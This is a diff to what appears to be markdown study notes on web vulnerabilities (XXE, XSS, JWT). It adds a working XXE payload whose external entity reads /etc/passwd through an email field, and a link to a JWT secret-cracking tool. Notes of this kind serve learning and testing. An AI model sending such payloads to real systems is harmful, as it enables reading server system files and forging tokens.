@@ -54,6 +54,13 @@ or change something
  </foodInfo>
  ```
  
+ ```
+ <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<root><name>a</name><tel>a</tel><email>&xxe;</email><password>a</password></root>
+```
+ 
  ### XSS (Cross-Site Scripting)
  
  Injection where an attacker can execute malicious scripts and execute on machine
@@ -141,3 +148,4 @@ HEAD.PAYLOAD.SECRET
 ```
 https://jwt.io/
 https://www.base64url.com/
+https://github.com/lmammino/jwt-cracker
